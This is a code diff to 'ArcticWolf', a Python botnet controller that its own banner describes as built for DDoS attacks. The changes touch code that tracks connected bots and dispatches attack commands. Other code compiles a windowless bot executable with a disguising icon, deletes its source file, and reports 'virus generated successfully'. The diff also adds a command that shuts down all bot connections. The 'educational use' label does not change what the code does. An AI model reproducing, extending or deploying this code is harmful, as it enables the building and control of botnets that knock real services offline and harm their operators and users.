@@ -1,12 +1,11 @@
 import threading, socket, time, json
-from sys import path, exit
+from sys import path
 from platform import system as system_type
 from os import system, remove, mkdir, _exit
 from os import path as os_path
 from shutil import rmtree, copy
 from random import randint
-
-buffsize = 512 #数据包大小
+from winsound import Beep
 datasock_list = {}  # 机器字典  {No:socket}
 last_Heartbeat = {}  # 记录机器的上次心跳时间
 ddos_attack_list = [] # 记录ddos的攻击列表
@@ -118,7 +117,7 @@ def post_cmd():
             else:
                 print_warn("TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
             try:
-                basic_command = f"pyinstaller -p {path[4]}/Lib/site-packages -F {name}.py {upx_command} -w --log-level FATAL --clean"
+                basic_command = f"pyinstaller -p {path[4]}/Lib/site-packages -F {name}.py {upx_command} -w -i ./Resource/icon.ico --log-level FATAL --clean"
                 system(basic_command)
             except Exception as e:
                 print_error(e)
@@ -126,12 +125,15 @@ def post_cmd():
             print_normal("clearing temp files")
             copy(f'./dist/{name}.exe', f'./{name}.exe')
             remove(f"{name}.spec")
+            remove(f'{name}.py')
             rmtree("build")
             rmtree("dist")
             print_good(f"{name}.exe virus generated successfully")
             
         elif command == 'attack':
             print_normal(f"Available attack method {mode_list}")
+        elif command == 'shut':
+            send('shut')
         elif command.split('_')[0] == 'attack':
             # ddos攻击
             target = command.split('_')[2]
@@ -158,6 +160,7 @@ def post_cmd():
             send(command)
         elif command == 'exit':
             History_write('Exit')
+            send('shut')
             _exit(0)
         elif command == 'help':
             #输出help
@@ -242,7 +245,7 @@ def tcplink():
             else:
                 return True
         except Exception as e:
-            print_error('An error occured: ' + e)
+            print_error('An error occured: ' + str(e))
 # 启动socket
 def run():
     while True:
@@ -254,6 +257,7 @@ def run():
                 if int(No) > biggest_No:
                     biggest_No = int(No)
             biggest_No += 1
+            Beep(440, 100)
             History_write(f'Bot connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}')
             print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}", line_break=True)
             last_Heartbeat[clientsock] = time.time()
@@ -289,9 +293,17 @@ def send(com : str):
     elif com.split('=')[0] == 'msg':
         for i in datasock_list.values():
             i.sendall(com.split('=')[1].encode('utf-8'))
-    elif com == 'check':
+    elif com == 'shut':
+        No = 1
         for i in datasock_list.values():
             i.sendall(com.encode('utf-8'))
+            History_write('Shuting down all the connections')
+            History_write(f'Bot No.{No} Disconnected')
+            print_warn('Shuting down all the connections')
+            print_normal(f'Bot No.{No} Disconnected')
+            del datasock_list[No]
+            del last_Heartbeat[i]
+            No += 1
     else:
         for i in datasock_list.values():
             i.sendall(com.encode('utf-8'))
@@ -347,7 +359,7 @@ if __name__ == '__main__':
 
 [ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
 ---------------------------------------------------------------------------
-[Version] : v0.1.2     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
+[Version] : v0.1.4     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
 
 ===========================================================================
 
